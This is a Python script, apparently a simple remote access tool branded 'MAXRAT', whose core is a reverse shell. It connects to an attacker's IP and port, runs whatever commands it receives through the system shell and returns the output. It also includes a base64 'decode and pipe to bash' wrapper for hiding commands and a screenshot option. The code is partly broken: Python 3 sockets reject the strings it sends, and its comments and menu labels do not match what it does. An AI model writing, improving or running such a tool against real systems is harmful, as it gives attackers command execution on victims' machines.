#!/usr/bin/python3

import os
import subprocess
import threading
import socket
import base64
import time

# Function to execute system commands
def execute_system_command(command):
    return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

# Function to connect to attacker machine
def connect_to_attacker(attacker_ip, attacker_port):
    try:
        print("Connecting to attacker...")
        time.sleep(2)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((attacker_ip, attacker_port))
        
        print("Connection established.\n")
        time.sleep(1)

        while True:
            command = s.recv(1024).decode("utf-8")
            if command == "exit":
                s.close()
                break
            elif command[:2] == "cd":
                os.chdir(command[3:])
                s.send("Directory changed to " + os.getcwd())
            else:
                command_result = execute_system_command(command)
                s.send(command_result)
    except Exception as e:
        print(str(e))
        pass

# Function to start reverse shell
def start_reverse_shell():
    try:
        attacker_ip = input("Enter attacker's IP: ")
        attacker_port = int(input("Enter attacker's port: "))
        print("Starting reverse shell...")
        time.sleep(2)
        connect_to_attacker(attacker_ip, attacker_port)
    except Exception as e:
        print(str(e))
        pass

# Function to encode script
def encode_script(script):
    encoded_script = base64.b64encode(script.encode("utf-8")).decode("utf-8")
    return f"echo '{encoded_script}' | base64 -d | bash"

# Function to take a screenshot of the target machine's desktop
def take_screenshot():
    try:
        print("Taking screenshot...")
        os.system("gnome-screenshot -f /home/kali/Desktop/screenshot.png")  # Save the screenshot in the attacker's desktop
        print("Screenshot saved as screenshot.png on your desktop.\n")
    except Exception as e:
        print(str(e))

if __name__ == "__main__":
    try:
        print("""
.___  ___.      ___      ___   ___ .______          ___   .___________.
|   \/   |     /   \     \  \ /  / |   _  \        /   \  |           |
|  \  /  |    /  ^  \     \  V  /  |  |_)  |      /  ^  \ `---|  |----`
|  |\/|  |   /  /_\  \     >   <   |      /      /  /_\  \    |  |     
|  |  |  |  /  _____  \   /  .  \  |  |\  \----./  _____  \   |  |     
|__|  |__| /__/     \__\ /__/ \__\ | _| `._____/__/     \__\  |__|     
                                                                         
        """)

        while True:
            print("\nWhat would you like to do next?\n")
            print("1. Set target IP and port")
            print("2. Enter command")
            print("3. Take Screenshot")
            print("4. Exit")
            choice = input("Enter your choice: ")

            if choice == "1":
                start_reverse_shell()
            elif choice == "2":
                while True:
                    command = input("Enter command: ")
                    if command == "exit":
                        break
                    else:
                        encoded_command = encode_script(command)
                        os.system(encoded_command)
            elif choice == "3":
                take_screenshot()
            elif choice == "4":
                break
            else:
                print("Invalid choice. Try again.")
    except Exception as e:
        print(str(e))
        pass
